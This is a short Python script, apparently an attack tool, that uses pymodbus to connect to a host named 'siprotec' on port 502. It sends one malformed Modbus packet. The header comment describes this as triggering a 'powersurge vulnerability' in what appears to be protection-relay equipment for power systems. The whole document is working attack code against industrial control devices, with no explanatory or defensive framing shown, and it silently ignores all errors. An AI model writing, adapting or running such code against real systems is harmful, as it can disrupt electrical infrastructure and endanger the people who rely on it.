# Send one malicious packet to execute powersurge vulnerability

from pymodbus.client.sync import ModbusTcpClient

# Server info
server_ip = "siprotec"
server_port = 502

# Create a Modbus TCP client
client = ModbusTcpClient(server_ip, port=server_port)

# Send a malformed Modbus packet to the siprotec
def send_malformed_packet():
    try:
        # Connect to the Modbus server
        if client.connect():
            # Craft a malformed Modbus packet
            malformed_packet = b'\x03\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            
            # Send the malformed packet
            response = client.send(malformed_packet)
    
    # ignore errors
    except Exception as e:
        pass
    else:
        pass

send_malformed_packet()
